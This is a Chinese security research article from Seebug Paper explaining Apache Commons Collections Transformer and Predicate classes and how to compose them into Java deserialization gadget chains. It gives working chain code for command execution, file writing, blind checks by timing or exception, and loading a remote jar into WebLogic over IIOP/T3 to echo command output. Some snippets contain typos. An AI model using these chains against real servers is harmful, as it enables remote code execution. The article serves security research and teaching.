**作者：宽字节安全  
公众号：<https://mp.weixin.qq.com/s/xwEOpEkPurwP119tonUzVQ>**

**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

### 0x01 简介

众所周知，CommonCollection
Gadget主要是由`ConstantTransformer`，`InvokerTransformer`，`ChainedTransformer`构成。gadget主要通过`Transformer`接口
的`transform`方法，对输入的对象做变换。`ConstantTransformer`不会做任何变换，只会返回类在实例化时传入的对象，`InvokerTransformer`会对类在实例化时传入的参数，通过反射去调用，`ChainedTransformer`将所有的`Transformer`连接起来，上一个`Transformer`的`transform`方法的结果，作为下一个`Transformer`的`transform`方法的参数。这样就完成java反序列化的gadget。下面为调用Runtime执行calc的CommonCollection的chain

    
    
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                    new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                    new ConstantTransformer(1) };

上面的chain等效与下面的代码

    
    
    Runtime.class.getMethod("getRuntime", new Class[0]).invoke(null, new Object

从上面的代码中我们可以暂时得出以下结论

  1. 只有链式调用的方法才可以被改写成CommonCollection执行链
  2. gadget中，不能有变量声明语句
  3. 没有while等语句
  4. 一切操作靠反射

### 0x02 CommonCollection其他Transform的简介

在`org.apache.commons.collections.functors`中，所有的类都可以被简单的分为三类，分别继承自`Transformer`接口，
`Predicate`接口，`Closure`接口。这三个接口主要有以下区别

  1. `Transformer`接口接收一个对象，返回对象的执行结果
  2. `Closure`接口接收一个对象，不返回对象的执行结果
  3. `Predicate`接口，类似条件语句，会根据执行结果，返回true或者false。这个将主要用在SwitchTransformer类中

对于我们来说，`Closure`接口没有太多用，下面主要介绍一下继承自`Transformer`接口的类与继承自`Predicate`接口的类

#### 继承自`Transformer`接口的类

##### ChainedTransformer

将实例化后的Transformer的类的数组，按顺序一个一个执行，前面的transform结果作为下一个transform的输出。

    
    
        public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }

##### CloneTransformer

调用并返回输入对象clone方法的结果

    
    
        public Object transform(Object input) {
            if (input == null) {
                return null;
            }
            return PrototypeFactory.getInstance(input).create();
        }

##### ClosureTransformer

将`Closure`接口的类转换为`Transformer`

    
    
        public Object transform(Object input) {
            iClosure.execute(input);
            return input;
        }

##### ConstantTransformer

调用transform方法，只返回类在实例化时存储的类

    
    
    public Object transform(Object input) {    return iConstant;}

##### ExceptionTransformer

抛出一个异常，FunctorException

    
    
    public Object transform(Object input) {    throw new FunctorException("ExceptionTransformer invoked");}

##### FactoryTransformer

调用相应的工厂类并返回结果

    
    
    public Object transform(Object input) {    return iFactory.create();}

##### InstantiateTransformer

根据给定的参数，在调用transform方法的时候实例化一个类

    
    
        public Object transform(Object input) {
            try {
                if (input instanceof Class == false) {
                    throw new FunctorException(
                        "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                            + (input == null ? "null object" : input.getClass().getName()));
                }
                Constructor con = ((Class) input).getConstructor(iParamTypes);
                return con.newInstance(iArgs);
    
            } catch (NoSuchMethodException ex) {
                throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
            } catch (InstantiationException ex) {
                throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
            } catch (IllegalAccessException ex) {
                throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
            } catch (InvocationTargetException ex) {
                throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
            }
        }

##### InvokerTransformer

调用transform方法的时候，根据类在实例化时提供的参数，通过反射去调用输入对象的方法

##### MapTransformer

在调用transform方法时，将输入函数作为key，返回类在实例化时参数map的value

    
    
    public Object transform(Object input) {    return iMap.get(input);}

##### NOPTransformer

啥也不干的Transformer

    
    
    public Object transform(Object input) {    return input;}

##### SwitchTransformer

类似if语句，在如果条件为真，则执行第一个Transformer，如果条件为假，则执行第二个Transformer

    
    
        public Object transform(Object input) {
            for (int i = 0; i < iPredicates.length; i++) {
                if (iPredicates[i].evaluate(input) == true) {
                    return iTransformers[i].transform(input);
                }
            }
            return iDefault.transform(input);
        }

##### PredicateTransformer

将Predicate包装为Transformer

    
    
    public Object transform(Object input) {    return (iPredicate.evaluate(input) ? Boolean.TRUE : Boolean.FALSE);}

##### StringValueTransformer

调用String.valueOf，并返回结果

    
    
    public Object transform(Object input) {
            return String.valueOf(input);
        }

### 继承自`Predicate`接口的类

##### AllPredicate

在执行多个Predicate，是否都返回true。

    
    
        public boolean evaluate(Object object) {
            for (int i = 0; i < iPredicates.length; i++) {
                if (iPredicates[i].evaluate(object) == false) {
                    return false;
                }
            }
            return true;
        }

##### AndPredicate

两个Predicate是否都返回true

    
    
    public boolean evaluate(Object object) {
           return (iPredicate1.evaluate(object) && iPredicate2.evaluate(object));
        }

##### AnyPredicate

与AllPredicate相反，只要有任一一个Predicate返回true，则返回true

    
    
        public boolean evaluate(Object object) {
            for (int i = 0; i < iPredicates.length; i++) {
                if (iPredicates[i].evaluate(object)) {
                    return true;
                }
            }
            return false;
        }

##### EqualPredicate

输入的对象是否与类在实例化时提供得对象是否一致

    
    
    public boolean evaluate(Object object) {    return (iValue.equals(object));}

##### ExceptionPredicate

在执行evaluate时抛出一个异常

##### FalsePredicate

永远返回False

##### IdentityPredicate

evaluate方法中输入的对象是否与类实例化时提供的类是否一样

    
    
    public boolean evaluate(Object object) {    return (iValue == object);}

##### InstanceofPredicate

输入的对象是否与类实例化时提供的类的类型是否一致

    
    
    public boolean evaluate(Object object) {    return (iType.isInstance(object));}

##### NotPredicate

对evaluate的结果取反操作

    
    
    public boolean evaluate(Object object) {    return !(iPredicate.evaluate(object));}

##### NullIsExceptionPredicate

如果输入的对象为null，则抛出一个异常

##### NullIsFalsePredicate

如果输入的对象为null，则返回false

##### NullIsTruePredicate

如果输入的对象为null，则返回true

##### NullPredicate

输入的对象是否为null

##### OrPredicate

类似与条件语句中的或

    
    
    public boolean evaluate(Object object) {   return (iPredicate1.evaluate(object) || iPredicate2.evaluate(object));}

##### TransformerPredicate

将一个Transformer包装为Predicate

### 0x03 使用方法

#### CommonCollection写入文件

这种方法通过InvokerTransformr调用构造函数，然后再写入文件。当然，这里我们可以使用InstantiateTransformer去实例化FileOutputStream类去写入文件，代码如下

    
    
                    new ChainedTransformer(new Transformer[]{
                            new ConstantTransformer(FileOutputStream.class),
                            new InstantiateTransformer(
                                    new Class[]{
                                            String.class, Boolean.TYPE
                                    },
                                    new Object[]{
                                            "filePath, false
                                    }),
                            new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{getRemoteJarBytes()})
                    }),

#### Gadget版盲注

思想类似于Sql的盲注。我们可以通过如下语句检测java进程是否是root用户

    
    
    if (System.getProperty("user.name").equals("root")){
        throw new Exception();
    }

我们可以通过如下cc链，执行该语句

    
    
            TransformerUtils.switchTransformer(
                    PredicateUtils.asPredicate(
                            new ChainedTransformer(new Transformer[]{
                                    new ConstantTransformer(System.class),
                                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getProperty", new Class[]{String.class}}),
                                    new InvokerTransformer("invoke",
                                            new Class[]{Object.class, Object[].class},
                                            new Object[]{null, new Object[]{"user.name"}}),
                                    new InvokerTransformer("toString",
                                            new Class[]{},
                                            new Object[0]),
                                    new InvokerTransformer("toLowerCase",
                                            new Class[]{},
                                            new Object[0]),
                                    new InvokerTransformer("contains",
                                            new Class[]{CharSequence.class},
                                            new Object[]{"root"}),
                            })),
                    new TransformerUtils.exceptionTransformer(),
                    new TransformerUtils.nopTransformer());

#### 是否存在某些文件

    
    
    if (File.class.getConstructor(String.class).newInstance("/etc/passed").exists()){
        Thread.sleep(7000);
    }

改写成cc链

    
    
    TransformerUtils.switchTransformer(
        PredicateUtils.asPredicate(
            new ChainedTransformer( new Transformer[] {
                new ConstantTransformer(File.class),
                new InstantiateTransformer(
                        new Class[]{
                                String.class
                        },
                        new Object[]{
                                path
                        }),
                new InvokerTransformer("exists", null, null)
            })
        ),
    
        new ChainedTransformer( new Transformer[] {
            new ConstantTransformer(Thread.class),
            new InvokerTransformer("getMethod",
                    new Class[]{
                            String.class, Class[].class
                    },
                    new Object[]{
                            "sleep", new Class[]{Long.TYPE}
                    }),
            new InvokerTransformer("invoke",
                    new Class[]{
                            Object.class, Object[].class
                    }, new Object[]
                    {
                            null, new Object[] {7000L}
                    })
        }),
    
        TransformerUtils.nopTransformer();)

#### weblogic iiop/T3回显

主要问题有
目前只能用URLClassloader，但是需要确定上传到weblogic服务器的位置。而这里我们知道，windows与linux的临时目录以及file协议访问上传文件的绝对路径肯定不一样。如果只用invokerTransform的话，最简单的执行回显的方案如下

    
    
    sequenceDiagram
    攻击者->>weblogic: 上传至Linux的临时目录/tmp/xxx.jar
    攻击者->>weblogic: 调用urlclassloader加载，安装实例
    攻击者->>weblogic:通过lookup查找实例，检测是否安装成功
    weblogic->>攻击者: 安装成功，结束
    weblogic->>攻击者: 安装失败，抛出异常
    攻击者->>weblogic: 上传至windows的临时目录 C:\\Windows\\Temp\\xxx.jar
    攻击者->>weblogic: 调用urlclassloader加载，安装实例
    攻击者->>weblogic:通过lookup查找实例，检测是否安装成功
    weblogic->>攻击者: 安装成功 结束
    weblogic->>攻击者: 安装失败

攻击一次weblogic服务器，最多可能需要发送6次反序列化包，才能成功的给weblogic服务器安装实例。这显然不符合我们精简代码的思想。下面我们用正常思维的方式去执行一下攻击过程

    
    
    if (os == 'win'){
        fileOutput(winTemp)
        }
    else{
        fileOutput(LinuxTemp)
        }
    if (os == 'win'){
        urlclassloader.load(winTemp)
        }
    else{
        urlclassloader.load(LinuxTemp)
        }

这里我们可以使用`SwitchTransformer` \+ `Predicate` \+ `ChainedTransformer` 组合去完成。

  1. `SwitchTransformer`类似于if语句
  2. `Predicate`类似于条件语句
  3. `ChainedTransformer` 将所有的语句串起来执行

`SwitchTransformer`类需要一个`Predicate`，而这里`TransformerPredicate`可以将一个Transformer转换为一个`Predicate`。所以我们需要一个可以判断操作系统的chain。然后将判断操作系统的chain作为`Predicate`，调用switchTransformer，根据结果，将可执行ja包写入win或者linux的临时目录。然后再调用第二个switchTransformer，根据操作系统的类型，调用URLclassloader分别加载相应上传位置的jar包，通过chainedTransformer将两个SwitchTransformer将两个SwitchTransform连接起来。代码如下

    
    
            Transformer t = TransformerUtils.switchTransformer(
                    PredicateUtils.asPredicate(
                            getSysTypeTransformer()
                    ),
                    new ChainedTransformer(new Transformer[]{
                            new ConstantTransformer(FileOutputStream.class),
                            new InstantiateTransformer(
                                    new Class[]{
                                            String.class, Boolean.TYPE
                                    },
                                    new Object[]{
                                            "C:\\Windows\\Temp\\xxx.jar", false
                                    }),
                            new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{getRemoteJarBytes()})
                    }),
                    TransformerUtils.nopTransformer());
    
            Transformer t1 = TransformerUtils.switchTransformer(
                    PredicateUtils.asPredicate(
                            getSysTypeTransformer()
                    ),
                    new ChainedTransformer(new Transformer[]{
                            new ConstantTransformer(URLClassLoader.class),
                            new InstantiateTransformer(
                                    new Class[]{
                                            URL[].class
                                    },
                                    new Object[]{
                                            new URL[]{new URL("file:/C:\\Windows\\Temp\\xxx.jar")}
                                    }),
                            new InvokerTransformer("loadClass",
                                    new Class[]{String.class}, new Object[]{className}),
                            new InvokerTransformer("getMethod",
                                    new Class[]{String.class, Class[].class}, new Object[]{"test", new Class[]{String.class}}),
                            new InvokerTransformer("invoke",
                                    new Class[]{Object.class, Object[].class}, new Object[]{null, new String[]{op}})}),
                    TransformerUtils.nopTransformer()); // 这块自行改成linux的吧
    
            Transformer list = new ChainedTransformer(new Transformer[]{
                    t,
                    t1
            });
    
        private static ChainedTransformer getSysTypeTransformer() {
            return new ChainedTransformer(new Transformer[]{
                    new ConstantTransformer(System.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getProperty", new Class[]{String.class}}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[]{"os.name"}}),
                    new InvokerTransformer("toString",
                            new Class[]{},
                            new Object[0]),
                    new InvokerTransformer("toLowerCase",
                            new Class[]{},
                            new Object[0]),
                    new InvokerTransformer("contains",
                            new Class[]{CharSequence.class},
                            new Object[]{"win"}),
            });
        }

### 0x04 参考

  1. <https://commons.apache.org/proper/commons-collections/apidocs/org/apache/commons/collections4/functors/SwitchTransformer.html>
  2. <https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html#WhileClosure>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1195/>

